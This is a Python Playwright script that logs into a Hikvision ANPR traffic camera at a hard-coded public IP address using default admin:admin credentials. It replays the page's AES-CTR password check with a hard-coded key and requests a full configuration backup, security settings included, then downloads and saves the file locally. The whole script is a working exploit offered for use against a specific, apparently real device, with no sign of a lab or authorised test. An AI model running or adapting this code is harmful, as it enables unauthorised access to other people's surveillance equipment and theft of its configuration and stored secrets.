import asyncio, base64, json
from playwright.async_api import async_playwright

"""
Hikvision RA5 ANPR Camera — Full Config Exfiltration
=====================================================
Dependencies: pip install playwright && python -m playwright install chromium
Run: python exfil_hikvision_ra5.py

Flow: Login → AesCtr(admin:admin, 天天) → verifypass.php → configbackup.php → download
"""

TARGET = "http://202.184.43.165"
USER = "admin"
PASS = "admin"

async def exfiltrate(security=1):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        print("[1] Login...")
        await page.goto(f"{TARGET}/login.htm", timeout=30000, wait_until="networkidle")
        try:
            await page.wait_for_function("document.body.style.display !== 'none'", timeout=15000)
        except Exception:
            pass
        await page.wait_for_timeout(3000)
        await page.fill("#username", USER)
        await page.fill("#usrpwd", PASS)
        await page.click("#submit")
        await page.wait_for_url("**/main.htm", timeout=15000)
        print("[+] Logged in!")
        await page.wait_for_timeout(2000)
        
        # Use browser's own AesCtr for correct encryption
        encrypted = await page.evaluate('AesCtr.encrypt("admin:admin", "天天", 128)')
        
        # verifypass
        resp = await page.evaluate(f"""
            async () => {{
                const r = await fetch("/verifypass.php", {{method: "POST", body: "{encrypted}"}});
                return await r.text();
            }}
        """)
        if resp != 'OK':
            print(f"[-] verifypass failed: {resp}")
            await browser.close()
            return None
        
        print("[2] verifypass OK, requesting config...")
        
        # configbackup — NOTE: type="config_backup" not "export", body uses "general" not "common"
        cfg = {"type": "config_backup", "body": {"general": 1, "system": 1, "security": security}}
        resp2 = await page.evaluate(f"""
            async () => {{
                const r = await fetch("/configbackup.php", {{
                    method: "POST",
                    headers: {{"Content-Type": "application/json"}},
                    body: '{json.dumps(cfg)}'
                }});
                return {{status: r.status, text: await r.text()}};
            }}
        """)
        
        data = json.loads(resp2['text'])
        if data.get('state') != 200:
            print(f"[-] configbackup failed: {resp2['text'][:200]}")
            await browser.close()
            return None
        
        # Decode download URL
        encoded = data["body"]["data"]
        dl_path = base64.b64decode(encoded).decode()
        dl_url = TARGET + "/" + dl_path
        print(f"[3] Download URL: {dl_path}")
        
        # Fetch the config file
        result = await page.evaluate(f"""
            async () => {{
                const r = await fetch("{dl_url}");
                if (!r.ok) return {{error: r.status}};
                const buf = await r.arrayBuffer();
                const bytes = new Uint8Array(buf);
                var b64 = "";
                for (var i = 0; i < bytes.length; i++) b64 += String.fromCharCode(bytes[i]);
                return {{ok: true, size: bytes.length, b64: btoa(b64)}};
            }}
        """)
        
        if result.get('ok'):
            raw = base64.b64decode(result['b64'])
            path = f"/tmp/hik_config_sec{security}.bin"
            with open(path, "wb") as f:
                f.write(raw)
            print(f"[+] SAVED {len(raw)} bytes -> {path}")
            print(f"    Format: JSON-lines, {raw[:100]}...")
            await browser.close()
            return path
        else:
            print(f"[-] Download failed: {result}")
            await browser.close()
            return None

if __name__ == "__main__":
    result = asyncio.run(exfiltrate(security=1))
    if result:
        print(f"\nDone! Config saved to {result}")
